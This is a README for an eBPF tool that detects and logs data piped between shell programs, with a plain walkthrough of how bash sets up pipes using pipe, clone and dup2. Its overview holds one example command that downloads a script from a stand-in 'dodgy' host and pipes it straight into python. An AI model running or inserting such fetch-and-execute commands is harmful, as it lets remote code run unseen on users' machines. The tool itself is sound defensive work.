# BPF-PipeSnoop
Example program using eBPF to log data being based in using shell pipes (`|`)

# Overview
Shells can parse data between programs using pipes, e.g.:
```bash
curl https://dodgy.com/loader.py | python -
```

In this example, a python script is downloaded from the internet and executed,
without the file being written to disk, and its content is not visible on the commnandline.


`pipesnoop` is a demonstration of how you could detect when data is being passed using pipes
and log it, all using eBPF.

# Building
```bash
# First clone the repository and the libbpf submodule
git clone --recursive https://github.com/pathtofile/bpf-pipesnoop.git
cd bpf-pipesnoop/src
make
```
This should generate the program `pipesnoop` in the same directory.

# Running
Just run as root and watch the output:
```bash
sudo ./pipesnoop
```

# How it works
(Note experts will have better descripion than this)
When bash is given a command to run multiple programs with a pipe in between, a number of things happen.
If the example is:
```bash
bash -c "apple | ball"
```
Then this will happen:

### Bash pipe
bash will use the syscall `pipe` to create an annonamous pipe.
This returns two file descriptors, 1 for each end of the pip, e.g. fds `3` and `4`.

### Bash clone
bash will call `clone` twice to create `apple` and `ball`.
Both programs inhearet all of bash's fds, so they also has fds `3` and `4`.
**important note** this means both `apple` and `ball` start running at (almost) the same time,
i.e. `ball` does *not* wait for `apple` to finish before running.

### Apple close and dup2
`apple` will close one end of the pipe e.g. `3`, then call `dup2` to overwrite its `stdout` or `1`
fd with the non-closed end of the pipe, e.g. `dup2(4, 1)`.

### Ball close and dup2
`ball` will close the other end of the pipe, e.g. `4`, then call `dup2` to overwrite its `stdin` or `0`
fd with the non-closed end of the pipe, e.g. `dup2(3, 0)`.

### Apple write
`apple` will start writing data to `stdout` like normal, but due to the `dup2`
call it ends up instead into the pipe.

### Ball read
`ball` will start reading data from its `stdin` like normal, but due to the `dup2`
call it ends up instead reading from the pipe.

### Pipe close
When `apple` closes, it will send an 'end of stream' down the pipe, so `ball` knows it has finished reading.


# Aknowledgements
The skeleton of this project was made with the help of [Libpf-Bootstrap](https://github.com/libbpf/libbpf-bootstrap).
